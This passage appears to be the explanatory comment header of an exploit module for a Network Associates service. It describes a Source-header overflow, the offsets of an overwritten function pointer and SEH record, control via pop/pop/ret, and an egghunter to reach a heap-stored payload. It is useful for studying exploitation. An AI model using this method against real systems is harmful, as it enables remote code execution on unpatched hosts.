	#
	# A long Source header results in a handful of exceptions.
	# The first exception occurs with a pointer at offset 116.
	# This exception occurs because a function pointer is
	# dereferenced from the overwritten data and then called:
	#  naisp32!naSPIPE_MainWorkFunc+0x3ed:
	#    mov ecx, [eax+0x270] (eax is offset 116)
	#    push ecx
	#    call [eax+0x26c]
	#
	# When this happens, the first SEH in the chain is also
	# overwritten at offset 96, so the exception results
	# in our code being called. If we knew of an address
	# in memory that pointed to our shellcode, we could
	# avoid the SEH completely and use the above call to
	# execute our code. This is actually practical, since
	# we can upload almost arbitrary amounts of data into
	# the heap and then overwrite the function pointer above.
	#
	# This method is left as an excercise to the reader.
	#
	# This module will use the SEH overwrite with a pop/pop/ret or
	# a jmp/call ebx (2000 only) to gain control of execution. This
	# removes the need for a large data upload and should result in
	# reliable execution without the need to brute force.
	#
	# Since the SEH method only leaves ~140 bytes of contiguous
	# shellcode space, we use an egghunter to find the real
	# payload that we stuffed into the heap as POST data.
